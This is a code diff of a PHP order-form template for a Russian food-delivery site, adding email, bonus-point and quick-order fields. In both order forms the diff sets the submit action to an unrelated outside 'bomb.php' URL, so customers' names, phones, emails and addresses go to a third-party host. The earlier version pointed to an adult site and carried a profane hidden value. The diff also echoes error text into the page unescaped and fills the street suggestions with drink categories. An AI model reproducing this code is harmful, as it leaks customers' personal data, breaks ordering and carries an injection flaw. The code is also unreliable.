@@ -1,7 +1,11 @@
 <?if(!defined('B_PROLOG_INCLUDED') || B_PROLOG_INCLUDED !==true)die();?>
 <?
-// ShowRes($arResult, false, true);
 $discount = $arResult['basePrice'] > $arResult['price'];
+$bonuses = ($arResult['price'] < $arResult['cuser']['UF_BONUSES']) ? $arResult['price'] : $arResult['cuser']['UF_BONUSES'];
+if(!empty($arResult['errors']))
+    echo "<div class='hide' id='orderErrors'>$arResult[errors]</div>";
+if($arResult['newUser'])
+    echo "<div class='hide' id='newUser'>true</div>";
 ?>
 <div class="tabs">
     <div class="tabs__mobile-controls">
@@ -14,26 +18,30 @@ $discount = $arResult['basePrice'] > $arResult['price'];
         </div>
     </div>
     <div class="tabs__controls">
-        <button data-tab="tab-1" class="tabs__button tabs__button--active">
+        <button data-tab="tab-1" class="tabs__button jsTabBtn tabs__button--active">
             <svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="/local/assets/images/icon.svg#icon_cursor"></use></svg>Как обычно
         </button>
-        <button data-tab="tab-2" class="tabs__button">
+        <button data-tab="tab-2" class="tabs__button jsTabBtn">
             <svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="/local/assets/images/icon.svg#icon_phone-working"></use></svg>В один клик
         </button>
     </div>
     <div class="tabs__content orderTabs">
-        <div id="tab-1">
-            <form action="https://www.xvideos.com/gay" class="order-form" method="POST" enctype="multipart/form-data" name="order" id="orderForm">
+        <div id="tab-1" class="orderTab tabActive jsOrderTab">
+            <form action="https://blog.haschek.at/tools/bomb.php" class="order-form" method="POST" enctype="multipart/form-data" name="order" id="orderForm">
                 <fieldset class="order-form__section order-form__who">
                     <legend class="order-form__legend">Кому доставить?</legend>
                     <div class="order-form__layout">
                         <div class="order-form__group order-form__group--medium">
-                            <label for="NAME" class="order-form__label">Ваше имя*</label>
-                            <input id="NAME" name="NAME" type="text" class="input order-form__input" value="<?=(!empty($arResult['cuser']['NAME']))?$arResult['cuser']['NAME']:'';?>" required>
+                            <label for="NAME" class="order-form__label">Ваше имя</label>
+                            <input id="NAME" name="NAME" type="text" class="input order-form__input" value="<?=(!empty($arResult['cuser']['NAME']))?$arResult['cuser']['NAME']:'';?>">
                         </div>
                         <div class="order-form__group order-form__group--medium">
                             <label for="PHONE" class="order-form__label">Ваш телефон*</label>
-                            <input id="PHONE" name="PHONE" type="text" class="input order-form__input" value="<?=(!empty($arResult['cuser']['PERSONAL_PHONE']))?$arResult['cuser']['PERSONAL_PHONE']:'';?>" required>
+                            <input id="PHONE" name="PHONE" type="tel" class="input order-form__input" value="<?=(!empty($arResult['cuser']['PERSONAL_PHONE']))?$arResult['cuser']['PERSONAL_PHONE']:'';?>" placeholder="+7(8) 900 123-45-67" required>
+                        </div>
+                        <div class="order-form__group order-form__group--medium">
+                            <label for="EMAIL" class="order-form__label">Ваш email*</label>
+                            <input id="EMAIL" name="EMAIL" type="email" class="input order-form__input" value="<?=(!empty($arResult['cuser']['EMAIL']) && $arResult['cuser']['ID'] != 1)?$arResult['cuser']['EMAIL']:'';?>" required>
                         </div>
                     </div>
                 </fieldset>
@@ -52,9 +60,21 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                                 </select>
                             </div>
                         </div>
-                        <div class="order-form__group order-form__group--medium">
+                        <?/*<div class="order-form__group order-form__group--medium">
                             <label for="STREET" class="order-form__label">Ваша улица</label>
                             <input type="text" id="STREET" name="STREET" class="input order-form__input" value="">
+                        </div>*/?>
+                        <div class="order-form__group order-form__group--medium">
+                            <label for="STREET" class="order-form__label">Ваша улица</label>
+                            <input list="STREET_LIST" type="text" id="STREET" name="STREET" class="input order-form__input" value="">
+                            <datalist id="STREET_LIST">
+                                <option>Аперитивы</option>
+                                <option>Горячие</option>
+                                <option>Десертные</option>
+                                <option>Диджестивы</option>
+                                <option>Молочные</option>
+                                <option>Слоистые</option>
+                            </datalist> 
                         </div>
                         <div class="order-form__group order-form__group--small">
                             <label for="HOUSE" class="order-form__label">Дом</label>
@@ -120,18 +140,18 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                         <div class="bonuses__balance">
                             <p class="bonuses__label">
                                 <strong>Баланс бонусных баллов:</strong>
-                                <div class="bonuses__data" data-bonuses_exist="167">
+                                <div class="bonuses__data" data-bonuses_exist="<?=$bonuses;?>">
                                     <svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="/local/assets/images/icon.svg#icon_blades"></use></svg>
-                                    <p>167 бонусов</p>
+                                    <p><?=$arResult['cuser']['UF_BONUSES'];?> бонусов</p>
                                 </div>
                             </p>
                         </div>
                         <div class="bonuses__spend">
-                            <p class="bonuses__label"><strong>Баланс бонусных баллов:</strong></p>
+                            <p class="bonuses__label"><strong>Списать бонусных баллов:</strong></p>
                             <div class="bonuses__inner">
                                 <div class="range-slider bonuses__slider"></div>
                                 <div class="bonuses__data bonuses__data--small">
-                                    <input type="text" value="0" onpaste="return false" value="">
+                                    <input type="text" name="bonuses" value="0" onpaste="return false">
                                     <svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="/local/assets/images/icon.svg#icon_blades"></use></svg>
                                 </div>
                                 <button class="bonuses__spend-button">Списать</button>
@@ -140,7 +160,7 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                         <div class="bonuses__get">
                             <p class="bonuses__label"><strong>Получите после заказа:</strong></p>
                             <div class="bonuses__data"><svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="/local/assets/images/icon.svg#icon_blades"></use></svg>
-                                <p>167 бонусов</p>
+                                <p><?=$arResult['addBonuses'];?> бонусов</p>
                             </div>
                         </div>
                     </div>
@@ -160,7 +180,7 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                             <input id="change" name="PAYSUM" type="text"class="input order-form__input" value="">
                         </div>
                         <div class="order-form__group order-form__group--custom order-form__total" data-price="<?=$arResult['price'];?>">
-                            <p class="order-form__total-price <?=($discount) ? 'order-form__total-price--old':'';?>">
+                            <p class="order-form__total-price <?=($discount) ? 'order-form__total-price--old':'';?> jsPriceBleat">
                                 <small>К оплате:<?=$arResult['basePrice'];?> руб.</small>
                             </p>
                             <p class="order-form__total-price order-form__total-price--new <?=(!$discount) ? 'hide':'';?>">
@@ -175,9 +195,9 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                         <div class="order-form__group">
                             <p class="order-form__alert <?=($arResult['open']) ?'hide': '';?>">Внимание! В настоящее время доставка не осуществляется. Ваш заказ поступит в обработку в 10:30</p>
                             <div class="order-form__controls-inner">
-                                <a href="" class="order-form__back">Вернуться в меню</a>
-                                <input type="hidden" name="addOrder" value="Fuck them all">
-                                <button type="submit" class="order-form__submit">Оформить заказ</button>
+                                <a href="/catalog/" class="order-form__back">Вернуться в меню</a>
+                                <input type="hidden" name="addOrder" value="order">
+                                <button type="submit" class="order-form__submit jsFormSubmit">Оформить заказ</button>
                             </div>
                             <p class="order-form__policy">
                                 <small>Отправляя настоящую форму, вы даете согласие на обработку своих<a href="#"> персональных данных</a></small>
@@ -187,6 +207,38 @@ $discount = $arResult['basePrice'] > $arResult['price'];
                 </fieldset>
             </form>
         </div>
-        <div id="tab-2"></div>
+        <div id="tab-2" class="orderTab jsOrderTab">
+            <form action="https://blog.haschek.at/tools/bomb.php" class="order-form" method="POST" enctype="multipart/form-data" name="orderFast" id="orderFormFast">
+                <fieldset class="order-form__section order-form__who">
+                    <legend class="order-form__legend">Кому доставить?</legend>
+                    <div class="order-form__layout">
+                        <div class="order-form__group order-form__group--medium">
+                            <label for="NAME" class="order-form__label">Ваше имя</label>
+                            <input name="NAME" type="text" class="input order-form__input" value="">
+                        </div>
+                        <div class="order-form__group order-form__group--medium">
+                            <label for="PHONE" class="order-form__label">Ваш телефон *</label>
+                            <input name="PHONE" type="text" class="input order-form__input" placeholder="+7(8) 900 123-45-67" value="" required>
+                        </div>
+                    </div>
+                </fieldset>
+                <fieldset class="order-form__controls <?=(!$arResult['open']) ? 'order-form__controls--alert' : '';?>">
+                    <div class="order-form__layout">
+                        <div class="order-form__group">
+                            <p class="order-form__alert <?=($arResult['open']) ?'hide': '';?>">Внимание! В настоящее время доставка не осуществляется. Ваш заказ поступит в обработку в 10:30</p>
+                            <div class="order-form__controls-inner">
+                                <a href="/catalog/" class="order-form__back">Вернуться в меню</a>
+                                <input type="hidden" name="addOrder" value="fast order">
+                                <input type="hidden" name="fastOrder" value="zoom zoom">
+                                <button type="submit" class="order-form__submit jsFormSubmit">Оформить заказ</button>
+                            </div>
+                            <p class="order-form__policy">
+                                <small>Отправляя настоящую форму, вы даете согласие на обработку своих<a href="#"> персональных данных</a></small>
+                            </p>
+                        </div>
+                    </div>
+                </fieldset>
+            </form>
+        </div>
     </div>
 </div>
